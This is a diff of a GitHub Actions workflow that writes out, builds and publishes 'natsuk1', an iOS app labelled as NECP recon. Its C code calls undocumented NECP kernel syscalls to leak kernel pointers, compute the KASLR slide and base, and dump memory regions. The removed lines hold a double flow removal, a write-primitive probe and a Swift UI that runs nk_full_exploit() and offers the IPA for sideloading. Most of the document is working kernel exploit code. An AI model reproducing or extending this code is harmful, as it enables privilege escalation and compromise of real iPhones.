@@ -119,12 +119,6 @@ jobs:
               mach_vm_address_t data,
               mach_vm_size_t *outsize);
 
-          extern kern_return_t mach_vm_write(
-              vm_map_t target_task,
-              mach_vm_address_t address,
-              vm_offset_t data,
-              mach_msg_type_number_t dataCnt);
-
           #ifndef SYS_NECP_OPEN
           #define SYS_NECP_OPEN 501
           #endif
@@ -141,6 +135,8 @@ jobs:
           #define NECP_ADD_FLOW 0x11
           #define NECP_REMOVE_FLOW 0x12
           #define NECP_SYSCTL_ARENA 0x0D
+          #define NECP_ROUTE_STATS 0x0B
+          #define NECP_FLOW_STATS 0x1B
           #define GATE_BYTE 9
 
           #define RESBUF 8192
@@ -165,7 +161,6 @@ jobs:
           #define LR(t, ...) lg(t, "> ", __VA_ARGS__)
 
           static int is_kptr(uint64_t v) { return v >= KPTR_MIN && v <= KPTR_MAX; }
-          static int is_user_va(uint64_t v) { return v >= 0x100000000ULL && v < 0x800000000000ULL; }
 
           static int nfd(void) { return (int)syscall(SYS_NECP_OPEN, 0); }
 
@@ -187,11 +182,6 @@ jobs:
                   fu[GATE_BYTE] |= 0x01;
               }
               return r;
-          }
-
-          static int nrm_flow(int fd, const uint8_t fu[16]) {
-              return (int)syscall(SYS_NECP_ACTION, fd, NECP_REMOVE_FLOW,
-                                  (void*)fu, (size_t)16, NULL, (size_t)0);
           }
 
           static int ncpy_result(int fd, const uint8_t cu[16], uint8_t *b, size_t bl) {
@@ -246,29 +236,19 @@ jobs:
                   }
                   LI(tag, "off=%d type=0x%02x len=%u", off, type, l);
                   off += 5 + l;
-                  if (l == 0) {
-                      LI(tag, "zero-len TLV, stopping");
-                      break;
-                  }
+                  if (l == 0) break;
               }
           }
 
           static int step_copy_result(void) {
               nk_log("");
-              LI("S1", "copy_result: add_client + add_flow + remove x2 + copy_result");
+              LI("S1", "copy_result");
               int fd = nfd();
               if (fd < 0) { LE("S1", "open errno=%d", errno); return -1; }
               uint8_t cu[16]; memset(cu, 0, sizeof(cu));
-              int r = nadd_client(fd, cu);
-              LI("S1", "add_client=%d", r);
-              if (r != 0) { close(fd); return -1; }
+              if (nadd_client(fd, cu) != 0) { close(fd); return -1; }
               uint8_t fu[16];
-              r = nadd_flow(fd, cu, fu);
-              LI("S1", "add_flow=%d", r);
-              if (r != 0) { close(fd); return -1; }
-              int r1 = nrm_flow(fd, fu);
-              int r2 = nrm_flow(fd, fu);
-              LI("S1", "remove#1=%d remove#2=%d", r1, r2);
+              if (nadd_flow(fd, cu, fu) != 0) { close(fd); return -1; }
               uint8_t buf[RESBUF]; memset(buf, 0, sizeof(buf));
               int c = ncpy_result(fd, cu, buf, sizeof(buf));
               LI("S1", "copy_result=%d bytes", c);
@@ -277,128 +257,111 @@ jobs:
                   hexdump("S1H", buf, c, 512);
                   int nk = scan_kptr("S1K", buf, c);
                   LI("S1", "kptr count = %d", nk);
-                  LI("S1", "TLV walk:");
                   tlv_walk("S1T", buf, c);
               }
               return c;
           }
 
-          static int probe_arena(uint64_t uva) {
-              if (!is_user_va(uva)) {
-                  LW("AR", "0x%llx not user VA", (unsigned long long)uva);
-                  return -1;
+          static int step_arena_twice(void) {
+              nk_log("");
+              LI("S2", "arena leak from two clients");
+
+              for (int i = 0; i < 2; i++) {
+                  int fd = nfd();
+                  if (fd < 0) { LE("S2", "open errno=%d", errno); return -1; }
+                  uint8_t cu[16]; memset(cu, 0, sizeof(cu));
+                  if (nadd_client(fd, cu) != 0) { close(fd); return -1; }
+                  uint64_t val = 0;
+                  int rc = nleak_kva(fd, &val);
+                  LI("S2", "client#%d rc=%d value=0x%llx", i, rc, (unsigned long long)val);
+                  close(fd);
               }
-
-              mach_port_t task = mach_task_self();
-              vm_address_t addr = (vm_address_t)uva;
-              vm_size_t size = 0;
-              vm_region_basic_info_data_64_t info;
-              mach_msg_type_number_t count = VM_REGION_BASIC_INFO_COUNT_64;
-              mach_port_t object_name = MACH_PORT_NULL;
-
-              kern_return_t kr = vm_region_64(task, &addr, &size,
-                                              VM_REGION_BASIC_INFO_64,
-                                              (vm_region_info_t)&info, &count,
-                                              &object_name);
-
-              if (kr != KERN_SUCCESS) {
-                  LE("AR", "vm_region kr=%d", kr);
-                  return -1;
-              }
-
-              LI("AR", "region start=0x%llx size=0x%llx prot=%d maxprot=%d",
-                 (unsigned long long)addr, (unsigned long long)size,
-                 info.protection, info.max_protection);
-              LI("AR", "readable=%d writable=%d executable=%d",
-                 (info.protection & VM_PROT_READ) != 0,
-                 (info.protection & VM_PROT_WRITE) != 0,
-                 (info.protection & VM_PROT_EXECUTE) != 0);
-
-              uint8_t rbuf[256];
-              memset(rbuf, 0, sizeof(rbuf));
-              mach_vm_size_t outsz = 0;
-              kr = mach_vm_read_overwrite(task,
-                                          (mach_vm_address_t)uva,
-                                          sizeof(rbuf),
-                                          (mach_vm_address_t)(uintptr_t)rbuf,
-                                          &outsz);
-              if (kr != KERN_SUCCESS) {
-                  LE("AR", "vm_read kr=%d", kr);
-                  return -1;
-              }
-              LI("AR", "read %llu bytes:", (unsigned long long)outsz);
-              hexdump("ARH", rbuf, (int)outsz, 256);
-              int nk = scan_kptr("ARK", rbuf, (int)outsz);
-              LI("AR", "kptr count = %d", nk);
-
-              if (info.protection & VM_PROT_WRITE) {
-                  uint64_t marker = 0xdeadbeefcafebabeULL;
-                  kr = mach_vm_write(task,
-                                     (mach_vm_address_t)uva,
-                                     (vm_offset_t)(uintptr_t)&marker,
-                                     sizeof(marker));
-                  LI("AR", "vm_write kr=%d", kr);
-                  if (kr == KERN_SUCCESS) {
-                      uint64_t verify = 0;
-                      mach_vm_size_t vsz = 0;
-                      kr = mach_vm_read_overwrite(task,
-                                                  (mach_vm_address_t)uva,
-                                                  sizeof(verify),
-                                                  (mach_vm_address_t)(uintptr_t)&verify,
-                                                  &vsz);
-                      if (kr == KERN_SUCCESS) {
-                          LI("AR", "verify read = 0x%llx (expected 0xdeadbeefcafebabe)",
-                             (unsigned long long)verify);
-                          if (verify == marker) {
-                              LO("AR", "ARENA IS WRITABLE AND READBACK WORKS");
-                              LR("AR", "potential write primitive!");
-                          }
-                      }
-                  }
-              } else {
-                  LI("AR", "arena not writable (prot=0x%x)", info.protection);
-              }
-
               return 0;
           }
 
-          static int step_sysctl_arena(void) {
+          static int step_region_dump(void) {
               nk_log("");
-              LI("S2", "sysctl_arena: add_client + op=0x0D");
+              LI("S3", "region dump 0x100000000 - 0x120000000");
+
+              mach_port_t task = mach_task_self();
+              vm_address_t addr = 0x100000000ULL;
+              vm_address_t limit = 0x120000000ULL;
+              int count = 0;
+
+              while (addr < limit && count < 60) {
+                  vm_size_t size = 0;
+                  vm_region_basic_info_data_64_t info;
+                  mach_msg_type_number_t cnt = VM_REGION_BASIC_INFO_COUNT_64;
+                  mach_port_t obj = MACH_PORT_NULL;
+
+                  kern_return_t kr = vm_region_64(task, &addr, &size,
+                                                  VM_REGION_BASIC_INFO_64,
+                                                  (vm_region_info_t)&info, &cnt, &obj);
+                  if (kr != KERN_SUCCESS) {
+                      LI("S3", "vm_region kr=%d at 0x%llx", kr, (unsigned long long)addr);
+                      break;
+                  }
+                  LI("S3", "0x%llx - 0x%llx  size=0x%llx prot=%d",
+                     (unsigned long long)addr,
+                     (unsigned long long)(addr + size),
+                     (unsigned long long)size,
+                     info.protection);
+                  addr += size;
+                  count++;
+                  if (size == 0) break;
+              }
+              return 0;
+          }
+
+          static int step_route_stats(void) {
+              nk_log("");
+              LI("S4", "op=0x0B route stats");
               int fd = nfd();
-              if (fd < 0) { LE("S2", "open errno=%d", errno); return -1; }
+              if (fd < 0) { LE("S4", "open errno=%d", errno); return -1; }
               uint8_t cu[16]; memset(cu, 0, sizeof(cu));
-              int r = nadd_client(fd, cu);
-              LI("S2", "add_client=%d", r);
-              if (r != 0) { close(fd); return -1; }
-              uint64_t val = 0;
-              int rc = nleak_kva(fd, &val);
-              LI("S2", "op=0x0D rc=%d value=0x%llx", rc, (unsigned long long)val);
+              if (nadd_client(fd, cu) != 0) { close(fd); return -1; }
+
+              uint8_t buf[256]; memset(buf, 0, sizeof(buf));
+              int c = (int)syscall(SYS_NECP_ACTION, fd, NECP_ROUTE_STATS,
+                                   (void*)cu, (size_t)16, buf, (size_t)0x48);
+              LI("S4", "op=0x0B returned %d", c);
               close(fd);
-              if (rc != 0) { LE("S2", "op failed rc=%d", rc); return -1; }
-
-              if (is_kptr(val)) {
-                  LO("S2", "kernel pointer! 0x%llx", (unsigned long long)val);
-                  uint64_t slide = val - KBASE;
-                  LO("S2", "slide = 0x%llx", (unsigned long long)slide);
-                  LO("S2", "base  = 0x%llx", (unsigned long long)(KBASE + slide));
-                  return 0;
+              if (c > 0) {
+                  hexdump("S4H", buf, c, 0x48);
+                  int nk = scan_kptr("S4K", buf, c);
+                  LI("S4", "kptr count = %d", nk);
               }
+              return c;
+          }
 
-              if (is_user_va(val)) {
-                  LI("S2", "treat as user VA 0x%llx, probing...", (unsigned long long)val);
-                  probe_arena(val);
-                  return 0;
+          static int step_flow_stats(void) {
+              nk_log("");
+              LI("S5", "op=0x1B flow stats");
+              int fd = nfd();
+              if (fd < 0) { LE("S5", "open errno=%d", errno); return -1; }
+              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
+              if (nadd_client(fd, cu) != 0) { close(fd); return -1; }
+
+              uint8_t fu[16]; memset(fu, 0, sizeof(fu));
+              if (nadd_flow(fd, cu, fu) != 0) { close(fd); return -1; }
+
+              uint8_t buf[0x200]; memset(buf, 0, sizeof(buf));
+              int c = (int)syscall(SYS_NECP_ACTION, fd, NECP_FLOW_STATS,
+                                   (void*)fu, (size_t)16, buf, (size_t)0x1ac);
+              LI("S5", "op=0x1B returned %d", c);
+              close(fd);
+              if (c > 0) {
+                  hexdump("S5H", buf, c, 0x1ac);
+                  int nk = scan_kptr("S5K", buf, c);
+                  LI("S5", "kptr count = %d", nk);
               }
-
-              LW("S2", "value out of ranges: 0x%llx", (unsigned long long)val);
-              return -1;
+              return c;
           }
 
           static int impl(void) {
               nk_log("");
               nk_log("================================================================");
-              nk_log("natsuk1 v4.6 - NECP recon");
+              nk_log("natsuk1 v4.7 - NECP recon");
               nk_log("iOS 27.0 / iPhone14,5 / 24A437");
               nk_log("================================================================");
               nk_log("");
@@ -406,8 +369,13 @@ jobs:
               if (fd < 0) { LE("PRE", "necp_open errno=%d", errno); return 1; }
               close(fd);
               LO("PRE", "necp_open OK");
+
               step_copy_result();
-              step_sysctl_arena();
+              step_arena_twice();
+              step_region_dump();
+              step_route_stats();
+              step_flow_stats();
+
               nk_log("");
               nk_log("======== done ========");
               return 0;
@@ -427,211 +395,6 @@ jobs:
           void nk_necp_cancel(void) {
               g_cancel = 1;
               nk_log("[!] cancel requested");
-          }
-          ENDFILE
-
-      - name: Write natsuk1.swift
-        run: |
-          cat > natsuk1/natsuk1.swift <<'ENDFILE'
-          import SwiftUI
-          import UIKit
-          import Foundation
-
-          final class LockedBuffer: @unchecked Sendable {
-              nonisolated(unsafe) static let shared = LockedBuffer()
-              private let lock = NSLock()
-              private var value: String = ""
-              private init() {}
-              func append(_ s: String) {
-                  lock.lock(); value += s + "\n"
-                  if value.count > 10000 { value = String(value.suffix(6000)) }
-                  lock.unlock()
-              }
-              func drain() -> String { lock.lock(); let v = value; value = ""; lock.unlock(); return v }
-              func clear() { lock.lock(); value = ""; lock.unlock() }
-          }
-
-          private let cCallback: @convention(c) (UnsafePointer<CChar>?) -> Void = { line in
-              guard let line = line else { return }
-              var bytes: [UInt8] = []
-              var p = line
-              while p.pointee != 0 { bytes.append(UInt8(bitPattern: p.pointee)); p = p.advanced(by: 1) }
-              let _line = String(decoding: bytes, as: UTF8.self)
-              LockedBuffer.shared.append(_line)
-              CrashLog.shared.writeLine(_line)
-              AppState.shared.parseLogLine(_line)
-          }
-
-          private func osVersionString() -> String {
-              let v = ProcessInfo.processInfo.operatingSystemVersion
-              return "\(v.majorVersion).\(v.minorVersion)"
-          }
-          private func appVersionString() -> String {
-              Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "1.0.0"
-          }
-
-          @main
-          struct natsuk1App: App {
-              var body: some Scene { WindowGroup { RootView() } }
-          }
-
-          struct RootView: View {
-              @StateObject private var state = AppState.shared
-              @StateObject private var offsets = OffsetsStore.shared
-              @StateObject private var airlift = AirliftBridge.shared
-              @AppStorage("auto_run") private var auto_run = false
-              @AppStorage("keep_alive_audio") private var keep_alive_audio = false
-              @AppStorage("keep_alive_location") private var keep_alive_location = false
-              @Environment(\.scenePhase) private var scenePhase
-
-              init() {
-                  UserDefaults.standard.register(defaults: [
-                      "auto_run": false, "keep_alive_audio": false,
-                      "keep_alive_location": false, "lang": "en"])
-              }
-
-              var body: some View {
-                  ContentView()
-                      .environmentObject(state)
-                      .environmentObject(offsets)
-                      .environmentObject(airlift)
-                      .onAppear {
-                          CrashLog.shared.install()
-                          if let prev = CrashLog.shared.recoverPreviousSession(), !prev.isEmpty {
-                              AppState.shared.previousCrash = prev
-                          }
-                          nk_set_log(cCallback)
-                          if state.log.isEmpty {
-                              state.append("[*] natsuk1 v\(appVersionString())")
-                              state.append("[*] iOS \(osVersionString()) / arm64e")
-                              state.append("")
-                          }
-                          if keep_alive_audio { KeepAlive.shared.startAudio() }
-                          if keep_alive_location { KeepAlive.shared.startLocation() }
-                          if auto_run {
-                              DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) { state.run() }
-                          }
-                      }
-                      .onChange(of: keep_alive_audio) { _, v in
-                          if v { KeepAlive.shared.startAudio() } else { KeepAlive.shared.stopAudio() }
-                      }
-                      .onChange(of: keep_alive_location) { _, v in
-                          if v { KeepAlive.shared.startLocation() } else { KeepAlive.shared.stopLocation() }
-                      }
-                      .onChange(of: scenePhase) { _, phase in
-                          if phase == .background {
-                              CrashLog.shared.markCleanShutdown()
-                          }
-                      }
-              }
-          }
-
-          final class AppState: ObservableObject, @unchecked Sendable {
-              nonisolated(unsafe) static let shared = AppState()
-              @Published var slide: String = "—"
-              @Published var base: String = "—"
-              @Published var previousCrash: String? = nil
-              @Published var showCrashLog: Bool = false
-
-              func parseLogLine(_ line: String) {
-                  if let v = Self.extractHex(line, keys: ["slide=0x", "SLIDE = 0x", "slide = 0x"]) {
-                      if self.slide != v {
-                          DispatchQueue.main.async { self.slide = v }
-                      }
-                  }
-                  if let v = Self.extractHex(line, keys: ["base=0x", "BASE = 0x", "base = 0x"]) {
-                      if self.base != v {
-                          DispatchQueue.main.async { self.base = v }
-                      }
-                  }
-              }
-
-              private static func extractHex(_ s: String, keys: [String]) -> String? {
-                  for k in keys {
-                      if let r = s.range(of: k) {
-                          var hex = ""
-                          for c in s[r.upperBound...] {
-                              if c.isHexDigit { hex.append(c) } else { break }
-                          }
-                          if !hex.isEmpty { return "0x" + hex }
-                      }
-                  }
-                  return nil
-              }
-              enum Status {
-                  case idle, running, ok, failed
-                  var color: Color {
-                      switch self {
-                      case .idle: return .secondary
-                      case .running: return .orange
-                      case .ok: return .green
-                      case .failed: return .red
-                      }
-                  }
-              }
-              @Published var log: String = ""
-              @Published var status: Status = .idle
-              @Published var running: Bool = false
-              @Published var show_respring: Bool = false
-              @Published var lang: String { didSet { UserDefaults.standard.set(lang, forKey: "lang") } }
-              private var flusher: Timer?
-
-              private init() {
-                  self.lang = UserDefaults.standard.string(forKey: "lang") ?? "en"
-                  startFlusher()
-              }
-              func t(_ en: String, _ ru: String) -> String { lang == "ru" ? ru : en }
-
-              private func startFlusher() {
-                  flusher?.invalidate()
-                  flusher = Timer.scheduledTimer(withTimeInterval: 0.3, repeats: true) { [weak self] _ in
-                      guard let self = self else { return }
-                      let chunk = LockedBuffer.shared.drain()
-                      if chunk.isEmpty { return }
-                      var newLog = self.log
-                      newLog += chunk
-                      if newLog.count > 30000 { newLog = String(newLog.suffix(20000)) }
-                      self.log = newLog
-                  }
-              }
-              func append(_ s: String) { LockedBuffer.shared.append(s) }
-              func run() {
-                  if running { return }
-                  running = true; status = .running
-                  Task.detached {
-                      _ = nk_full_exploit()
-                      await MainActor.run {
-                          AppState.shared.running = false
-                          AppState.shared.status = .ok
-                      }
-                  }
-              }
-              func necp_run() {
-                  if running { return }
-                  running = true; status = .running
-                  Task.detached {
-                      let rc = nk_necp_run()
-                      await MainActor.run {
-                          AppState.shared.running = false
-                          AppState.shared.status = (rc == 0) ? .ok : .failed
-                      }
-                  }
-              }
-              func respring() {
-                  DispatchQueue.main.async {
-                      guard let scene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
-                            let window = scene.windows.first(where: { $0.isKeyWindow }) ?? scene.windows.first,
-                            let root = window.rootViewController else { return }
-                      let host = UIHostingController(rootView: RespringView().ignoresSafeArea())
-                      host.modalPresentationStyle = .fullScreen
-                      root.present(host, animated: false)
-                  }
-              }
-              func clear() { LockedBuffer.shared.clear(); log = "" }
-              func cancel() {
-                  nk_necp_cancel()
-                  append("[*] cancel requested")
-              }
           }
           ENDFILE
 
@@ -685,7 +448,7 @@ jobs:
           fi
           REPO="${{ github.repository }}"
           IPA_URL="https://github.com/${REPO}/releases/download/development/natsuk1.ipa"
-          NOTES="natsuk1 v4.6 dev
+          NOTES="natsuk1 v4.7 dev
 
           IPA: ${IPA_URL}
           AltStore: altstore://install?url=${IPA_URL}
